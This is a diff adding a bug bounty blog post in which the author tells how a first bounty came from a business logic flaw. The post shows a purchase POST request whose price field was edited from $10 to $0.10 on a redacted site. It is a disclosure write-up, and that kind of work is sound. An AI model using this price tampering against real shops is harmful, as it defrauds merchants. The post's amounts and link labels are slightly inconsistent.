@@ -1,0 +1,55 @@
+
+export const metadata = {
+  title: "my first bounty as a bug bounty hunter (business logic)",
+  date: "2021-03-13",
+  summary: "A personal journey of getting the first bounty as a bug bounty hunter by finding a business logic vulnerability.",
+};
+
+# Introduction
+
+Hello,  
+I want to share with you my journey getting my first bounty as a bug bounty hunter. I started exploring the bug bounty world when I saw sir Japz Divino and Tech in the Province videos on YouTube explaining what is bug bounty and how they got started as hunters. Of course, I had some experience in the Cyber World, but it was only a little amount of it. After listening to their advice, I joined their Facebook community and started exploring a list of easy bugs. After learning a few interesting bugs, I began hunting them in the real world.
+
+- Japz Divino — [YouTube](https://www.youtube.com/@TechInTheProvince)
+- Tech in the Province — [YouTube](https://www.youtube.com/@japzdivino)
+
+# HOW I MANAGED TO GET MY FIRST BOUNTY
+
+So, I started joining BugCrowd and HackerOne platforms, but I didn’t have many good findings. I then decided to start dorking some Bug Bounty programs outside of these two platforms. After some exploration, I found one that caught my attention. When I began buying items, I noticed that the item price was visible in the POST request. I tried changing the price from $10 to $0.1, and it was a success!
+
+The request looked like this:
+```http
+POST /v1/buy HTTP/1.1
+Host: api.redacted
+{
+  "base_amount": "10.00000000",
+  "source_client": "web",
+  "pay_with_wallet": "true",
+  "product_code": "PRODUCT10",
+  "recipient_email": "xxxx@mail.com"
+}
+```
+
+Edited Request:
+
+```http
+{
+  "base_amount": "0.10000000",
+  "source_client": "web",
+  "pay_with_wallet": "true",
+  "product_code": "PRODUCT10",
+  "recipient_email": "xxxx@mail.com"
+}
+
+```
+
+<img src="https://miro.medium.com/v2/resize:fit:1004/format:webp/1*wKcmALMMwAQ4CyvVbjzbgQ.png" alt="image" />
+
+I was able to change the base_amount from $10 to $1.
+
+
+## Timeline
+
+[02/08/2021] — Bug reported
+
+[03/13/2021] — Rewarded $X,XXX
